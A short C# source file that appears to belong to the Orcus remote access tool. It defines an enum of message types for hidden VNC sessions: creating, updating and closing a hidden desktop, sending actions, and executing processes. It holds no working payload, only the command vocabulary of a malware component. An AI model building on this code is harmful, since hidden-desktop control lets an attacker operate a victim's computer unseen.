namespace Orcus.Shared.Commands.HVNC
{
    public enum HvncCommunication
    {
        CreateDesktop,
        ResponseDesktopCreated,
        GetUpdate,
        CloseDesktop,
        DoAction,
        ExecuteProcess,
        ResponseUpdate,
        ResponseDesktopNotOpened,
        ResponseUpdateFailed,
        ResponseDesktopClosed,
        ResponseProcessExecuted
    }
}